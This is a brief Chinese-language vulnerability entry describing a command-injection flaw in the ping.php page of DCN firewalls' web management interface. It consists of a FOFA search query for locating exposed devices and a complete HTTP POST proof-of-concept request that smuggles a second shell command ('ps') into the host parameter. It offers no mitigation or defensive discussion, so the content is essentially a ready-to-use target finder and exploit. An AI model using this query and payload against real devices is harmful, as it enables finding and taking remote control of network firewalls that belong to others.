# DCN防火墙ping.php存在命令执行漏洞



## fofa

```javascript
body="北京神州数码云科信息技术有限公司" && title=="Web Management"
```

## poc

```javascript
POST /function/system/tool/ping.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Connection: close
Cookie: cookie
Upgrade-Insecure-Requests: 1
Priority: u=4

dcn_test_a_967=21&dcn_test_b_967=122&dcn_test_c_967=111&dcn_test_d=_967&doing=ping&host=1;ps&proto=&count=1
```

